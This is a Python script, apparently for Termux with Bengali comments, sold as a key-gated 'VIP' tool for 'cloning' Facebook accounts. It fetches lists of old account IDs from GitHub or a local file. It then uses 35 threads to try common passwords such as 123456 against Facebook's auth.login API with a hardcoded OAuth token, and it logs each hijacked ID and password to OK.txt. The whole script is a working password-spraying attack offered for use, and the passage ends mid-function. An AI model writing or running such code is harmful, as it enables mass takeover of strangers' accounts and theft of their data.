import os, time, random, sys, requests, uuid

#--- [ COLOR SETTINGS ] ---#
G = '\033[1;92m' # Green
Y = '\033[1;93m' # Yellow
W = '\033[1;97m' # White
S = '\033[1;96m' # Sky Blue
R = '\033[1;91m' # Red

#--- [ GLOBAL DATA ] ---#
loop, oks, cps = 0, [], []

#--- [ KEY APPROVAL SYSTEM ] ---#
def approval():
    os.system('clear')
    # ইউজার ডিভাইসের আইডি এবং হার্ডওয়্যার আইডি দিয়ে ইউনিক কী
    try:
        device_id = os.getlogin().upper()
    except:
        device_id = "SHAHIN"
    
    unique_id = str(uuid.getnode())[:5]
    key = f"SHAHIN-VIP-{device_id}-{unique_id}"
    
    # আপনার গিটহাব লিঙ্ক
    approval_url = "https://raw.githubusercontent.com/w8Shahin/Approval-control/refs/heads/main/Keys.txt"
    
    print(f"{G} [•] WELCOME TO SHAHIN VIP TOOL")
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    try:
        # গিটহাব থেকে এপ্রুভড কী-র লিস্ট আনা
        active_keys = requests.get(approval_url).text
        
        if key in active_keys:
            print(f" {G}[√] STATUS : APPROVED ACCESS")
            print(f" {W}[•] WELCOME SHAHIN BIN AHMED USER")
            print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            time.sleep(2)
            Main()
        else:
            # যদি এপ্রুভ না থাকে তবে কী দেখাবে
            print(f" {R}[×] STATUS : NOT APPROVED")
            print(f" {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f" {W}[•] YOUR KEY : {G}{key}")
            print(f" {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f" {Y}[!] এই কী (Key) টি কপি করে এডমিনকে পাঠান।")
            print(f" {W}[•] এডমিন এপ্রুভ করলে তবেই টুল চলবে।")
            input(f"\n {G}[ENTER] করলে হোয়াটসঅ্যাপে মেসেজ যাবে...")
            # আপনার হোয়াটসঅ্যাপ লিঙ্ক (নম্বর পরিবর্তন করে নিন)
            os.system(f'termux-open-url "https://wa.me/+8801XXXXXXXXX?text=Approve%20My%20Key:%20{key}"')
            sys.exit()
            
    except Exception as e:
        print(f" {R}[!] নেটওয়ার্ক সমস্যা অথবা গিটহাব লিঙ্ক ভুল!")
        sys.exit()

#--- [ LOGO ] ---#
def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}V20{W}''')
    print(f' {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f' {W}[{G}•{W}] OWNER    : {G}SHAHIN BIN AHMED')
    print(f' {W}[{G}•{W}] STATUS   : {G}APPROVED ACCESS')
    print(f' {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

#--- [ MAIN MENU ] ---#
def Main():
    logo()
    print(f' {G}[1]{W} CLONE OLD ACTIVE IDS {S}(ONLINE DUMP)')
    print(f' {G}[2]{W} CLONE FROM YOUR OWN FILE')
    print(f' {G}[0]{W} EXIT')
    opt = input(f'\n {W}[{G}•{W}] CHOOSE : {G}')
    
    if opt == '1':
        online_dump()
    elif opt == '2':
        file_crack()
    else:
        exit()

#--- [ CLONING METHODS ] ---#
def online_dump():
    logo()
    print(f" {W}[•] Downloading Active Old IDs from GitHub...")
    # গিটহাব থেকে ডাম্প ফাইল নামানো
    url = "https://raw.githubusercontent.com/Social-Engineer-Tool/dumps/main/bd_old_ids.txt"
    try:
        data = requests.get(url).text
        with open('dump.txt', 'w') as f:
            f.write(data)
        start_cloning('dump.txt')
    except:
        print(f" {R}[!] Download Failed!"); time.sleep(2); Main()

def file_crack():
    logo()
    path = input(f" {W}[+] ENTER FILE PATH : {G}")
    if os.path.exists(path):
        start_cloning(path)
    else:
        print(f" {R}[!] File Not Found!"); time.sleep(2); Main()

def start_cloning(file_path):
    try:
        ids = open(file_path, 'r').read().splitlines()
    except:
        print(f" {R}[!] Error Reading File!"); exit()
    
    logo()
    print(f" {W}[•] TOTAL TARGET : {len(ids)}")
    print(f" {W}[•] TARGET PASS   : {Y}123456, 1234567, 123456789")
    print(f" {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    with ThreadPool(max_workers=35) as engine:
        for user in ids:
            uid = user.split('|')[0]
            # ওল্ড আইডির জন্য শক্তিশালী কমন পাসওয়ার্ড
            pws = ['123456', '1234567', '12345678', '123456789', '11223344', '55667788', '572737']
            engine.submit(crack_engine, uid, pws, len(ids))

def crack_engine(uid, pws, limit):
    global loop, oks
    # ওল্ড আইডির জন্য স্ট্যাবল ইউজার এজেন্ট
    ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        data = {'email': uid, 'password': pw, 'format': 'json'}
        try:
            res = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers).json()
            if 'session_key' in res:
                print(f'\r\r{G}[SHAHIN-OK] {uid} | {pw}{W}')
                oks.append(uid)
                open('OK.txt', 'a').write(uid+'|'+pw+'\n')
                break
